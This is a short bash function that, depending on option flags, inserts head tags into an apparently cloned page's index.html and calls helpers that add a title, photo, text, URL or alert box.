mas_opciones(){
if [[ $show == "t" || $show == "i" || $show == "d" || $show == "u" || $show == "a" ]];then

if [[ $si_clone == "si" ]];then
sed -i '1i <head>' $carpeta/index.html
sed -i '2i </head>' $carpeta/index.html

fi
fi

if [[ $show == "t" ]];then
show_title
fi
if [[ $show0 == "i" ]];then
show_photo
fi
if [[ $show1 == "d" ]];then
show_text
fi
if [[ $show2 == "u" ]];then
show_url
fi
if [[ $show3 == "a" ]];then
add_alert_box
fi
}

